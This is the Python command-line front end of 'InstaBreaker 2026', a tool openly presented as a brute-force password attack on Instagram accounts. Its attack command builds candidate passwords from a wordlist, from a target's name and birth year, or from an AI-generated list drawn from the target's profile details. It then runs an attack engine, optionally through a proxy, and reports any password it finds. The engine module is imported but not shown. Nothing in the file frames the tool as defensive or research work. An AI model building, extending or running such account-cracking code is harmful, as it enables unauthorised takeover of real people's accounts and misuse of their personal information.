import asyncio
import typer
from typing import Optional, List
from pathlib import Path
from rich.progress import Progress

from .utils.display import display
from .utils.config import settings
from .core.engine import BreakerEngine
from .core.wordlist import WordlistGenerator
from .core.session import SessionManager

app = typer.Typer(help="InstaBreaker 2026: A modern Instagram tool.")

@app.command()
def attack(
    username: str = typer.Argument(..., help="Target Instagram username"),
    wordlist: Optional[Path] = typer.Option(None, "--wordlist", "-w", help="Path to wordlist file"),
    proxy: Optional[str] = typer.Option(None, "--proxy", "-p", help="Proxy URL (e.g. http://127.0.0.1:8080)"),
    ai: bool = typer.Option(False, "--ai", help="Use AI to generate wordlist"),
):
    """Start a brute-force attack against a target account."""
    display.banner()
    
    passwords = []
    if wordlist:
        if wordlist.exists():
            passwords = wordlist.read_text().splitlines()
        else:
            display.error(f"Wordlist file not found: {wordlist}")
            raise typer.Exit(1)
    elif ai:
        profile_info = typer.prompt("Enter any known profile info (name, bio, interests, etc.)")
        generator = WordlistGenerator()
        display.log("Generating AI wordlist...")
        try:
            passwords = asyncio.run(generator.generate_with_ai(profile_info))
        except Exception as e:
            display.error(f"AI generation failed: {e}")
            raise typer.Exit(1)
    else:
        name = typer.prompt("Enter target's name")
        year = typer.prompt("Enter target's birth year", default="")
        generator = WordlistGenerator()
        passwords = generator.generate_from_template(name, year)

    if not passwords:
        display.error("No passwords to test.")
        raise typer.Exit(1)

    display.log(f"Starting attack on {username} with {len(passwords)} passwords...")
    
    engine = BreakerEngine(username, passwords, proxy=proxy)
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Attacking...", total=len(passwords))
        
        def update_progress(n):
            progress.update(task, advance=n)
            
        found = asyncio.run(engine.run(progress_callback=update_progress))

    if found:
        display.success(f"Attack successful! Password: {found}")
    else:
        display.error("Attack failed. No password found.")

@app.command()
def sessions():
    """List saved sessions."""
    display.banner()
    sessions = SessionManager.list_sessions()
    if not sessions:
        display.log("No saved sessions found.")
        return
    
    display.show_table("Saved Sessions", ["Username"], [[s] for s in sessions])

@app.command()
def config(
    openai_key: Optional[str] = typer.Option(None, "--openai-key", help="Set OpenAI API Key")
):
    """Manage configuration."""
    if openai_key:
        # Simple way to save to .env
        env_path = Path(".env")
        lines = []
        if env_path.exists():
            lines = env_path.read_text().splitlines()
        
        new_lines = [l for l in lines if not l.startswith("OPENAI_API_KEY=")]
        new_lines.append(f"OPENAI_API_KEY={openai_key}")
        env_path.write_text("\n".join(new_lines))
        display.success("OpenAI API Key saved to .env")
    else:
        display.log(f"Config directory: {settings.app_dir}")
        display.log(f"Sessions directory: {settings.sessions_dir}")
        display.log(f"OpenAI API Key: {'Set' if settings.openai_api_key else 'Not set'}")

if __name__ == "__main__":
    app()
